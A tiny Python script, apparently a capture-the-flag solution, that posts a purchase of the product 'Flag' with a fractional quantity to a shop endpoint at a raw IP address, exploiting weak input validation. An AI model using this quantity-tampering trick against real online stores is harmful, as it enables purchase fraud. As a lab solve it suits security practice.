import requests
url = "http://45.122.249.68:10011/shop/"
json={"product": "Flag", "quantity": 0.0000001}
response = requests.post(url, json=json)
print(response.text)